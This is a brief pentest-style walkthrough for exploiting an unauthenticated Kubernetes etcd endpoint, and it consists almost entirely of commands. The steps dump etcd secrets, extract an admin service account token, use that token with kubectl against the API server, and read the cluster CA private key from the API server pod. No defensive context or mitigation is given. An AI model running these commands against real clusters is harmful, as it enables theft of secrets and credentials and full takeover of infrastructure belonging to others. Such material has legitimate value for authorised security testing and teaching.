## Unauthenticated ETCD

1. Exploiting this takes a couple of steps
2. Set the ETCD environment variable `export ETCDCTL_API=3`
3. First we need to dump some secrets out of the etcd database 
  `etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[CLUSTERIP]:2379 get / --prefix --keys-only | grep token`
4. Then we'll need a service account token to authenticate to the cluster with. Looking through the list of accounts we can see an admins-account
  `etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[IP]:2379 get /registry/secrets/kube-system/admins-account-token-[RAND]`
  The service account token starts with ey and ends just before the word `kubernetes.io` in the token. 
5. With the service token we can use kubectl , first get the API pod name
  `kubectl --insecure-skip-tls-verify -shttps://[IP]:6443/ --token="[TOKEN]" -n kube-system get po`

6. Then get the key   
  `kubectl --insecure-skip-tls-verify -shttps://[IP]:6443/ --token="[TOKEN]" -n kube-system exec [API_SERVER_POD] cat /etc/kubernetes/pki/ca.key`
